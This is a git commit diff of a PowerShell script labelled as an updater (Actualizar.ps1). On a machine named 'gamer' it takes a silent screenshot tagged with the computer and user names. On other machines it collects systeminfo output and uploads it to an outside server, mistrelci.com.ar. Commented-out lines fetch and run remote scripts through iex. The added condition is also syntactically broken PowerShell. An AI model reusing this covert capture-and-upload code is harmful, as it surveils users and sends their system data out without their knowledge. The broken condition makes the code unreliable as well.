028e774aeab2967946e060173a917a2107087d8e
jeremiassamuelzitnik <69435115+jeremiassamuelzitnik@users.noreply.github.com>
2023-07-01 17:04:59 -0300

    Update Actualizar.ps1

--- Actualizador/Actualizar.ps1
+++ Actualizador/Actualizar.ps1
@@ -1,8 +1,33 @@
 #Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 #choco install clickpaste -y
 #choco install everything -y
+if $env:computername = 'gamer' {
+$Path = "$env:temp"
+# Make sure that the directory to keep screenshots has been created, otherwise create it
+If (!(test-path $path)) {
+New-Item -ItemType Directory -Force -Path $path
+}
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+# Get the current screen resolution
+$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+# Create a graphic object
+$graphic = [System.Drawing.Graphics]::FromImage($image)
+$point = New-Object System.Drawing.Point(0, 0)
+$graphic.CopyFromScreen($point, $point, $image.Size);
+$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
+# Get a screenshot
+[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
+$screen_file = "$Path\" + $env:computername + "_" + $env:username + "_" + "$((get-date).tostring('yyyy.MM.dd-HH.mm.ss')).png"
+# Save the screenshot as a PNG file
+$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png)
+}
+
+else {
+
 systeminfo >> "$env:temp\$env:computername.log"
 (New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php', $env:temp + '\'+ $env:computername + '.log')
+}
 #powershell "iwr -useb https://raw.githubusercontent.com/jeremiassamuelzitnik/Updater/main/Instalador/Instalar.ps1 | iex" 
 #get-wuinstall -MicrosoftUpdate -install -AcceptAll -IgnoreReboot | Out-File $env:public\desktop\acta-$env:computername.log
 
